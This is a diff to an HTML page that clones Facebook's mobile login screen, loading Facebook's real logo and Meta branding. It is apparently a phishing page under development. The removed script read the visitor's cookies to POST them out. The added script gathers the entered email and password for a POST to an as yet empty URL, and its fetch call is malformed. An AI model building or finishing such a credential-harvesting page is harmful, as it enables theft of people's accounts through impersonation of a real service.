@@ -5,36 +5,46 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Facebook-log in</title>
     <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.0/css/all.min.css"/>
 </head>
-<body style="background-color: black;">
+<body style="background-color:#EFF5FD;">
 
 
-    <div class="max-w-[600px] h-svh bg-[#EFF5FD] p-5 ">
-        <div class="w-full h-full grid row-span-3">
-            <div class="h-auto bg-[pink] ">
-                <h1>English(UK)</h1>
-                <div>
-                    <img src="" alt="">
+    <div class="max-w-[1300px] m-auto h-svh bg-[#EFF5FD] p-5 ">
+        <div class="w-full h-full ">
+            <div class="h-auto">
+                <div class="flex justify-center">
+                    <h1 class="text-[18px]">English <span class="font-[bold]">(UK)</span></h1>
+                </div>
+                <div class="w-[240px] h-[8vh] m-auto my-[9vh] flex justify-center">
+                    <img src="https://z-m-static.xx.fbcdn.net/rsrc.php/v3/yD/r/5D8s-GsHJlJ.png" alt="image">
                 </div>
             </div>
-            <div class="h-auto bg-[white] ">
-                <input type="text" name="" id="">
-                <input type="text" name="" id="">
-                <button>login</button>
-                <a href="">Forgote Password?</a>
+            <div class="h-auto ">
+                <form action="" method="post">
+                    <input class="border rounded-2xl px-4 w-full h-[70px] my-[5px] placeholder:text-[gray] placeholder:font-[500]" placeholder="Mobile number or email address" type="email" name="" id="">
+                    <div class="w-full relative">
+                        <input id="email" id="password" class="border placeholder:text-[gray] placeholder:font-[500] rounded-2xl px-4 w-full h-[70px] my-[10px] font-[600]" placeholder="Password" type="password" name="" id="">
+                        <i id="eye-of-password" class="fa-regular fa-eye-slash absolute right-10 text-2xl top-7 text-[gray] cursor-pointer hidden"></i>
+                    </div>
+                    <button id="btn-log" class="w-full h-[50px] bg-[#0068FF] rounded-full cursor-pointer text-white text-xl">Log in</button>
+                    <div class="flex justify-center my-5 font-[500]">
+                        <a href="#" class="">Forgotten Password?</a>
+                    </div>
+                </form>
             </div>
-            <div class="w-[200px] h-10 bg-[gray]">
-                <button>Create new account</button>
-                <div>
-                    <img src="" alt="">
+            <div class="w-[full]">
+                <button class="w-full border border-[#0068FF] mt-16 rounded-full h-[50px] text-[#0068FF] font-[500]">Create new account</button>
+                <div class="w-full flex justify-center my-5 text-[black]  item-center font-[500]">
+                    <i class="fa-brands fa-meta mt-[3px] mr-1"></i>
                     <h3>Meta</h3>
                 </div>
-                <div>
+                <div class="flex justify-center text-[13px] text-[gray]">
                     <h3>About</h3>
-                    <h3>Help</h3>
+                    <h3 class="mx-4">Help</h3>
                     <h3>More</h3>
                 </div>
-            </div>.
+            </div>
         </div>
     </div>
     
@@ -42,19 +52,23 @@
 
     <script>
 
-        let Cookes = document.cookie
+        const emailInput = document.getElementById("email");
+        const passwordInput = document.getElementById('password');
+        const BUTTON_POST = document.getElementById('btn-log');
 
-        function post_data(){
+        const post_FUN = async () => {
 
-            fetch("" , {
-                method:"POST",
-                body: JSON.stringify(Cookes)
-            })
-            .then( res => console.log(res))
-            .catch(err => console.error(err))
-    
-            console.log("Cookes : ",Cookes)
-        }
+            const data = {
+                email: emailInput.value,
+                password: passwordInput.value
+            };
+
+            fetch("", { method: "POST"} , data)
+            .then(response => console.log(response))
+            .catch(error => console.error('Error:', error));
+
+
+        };
 
 
     </script>
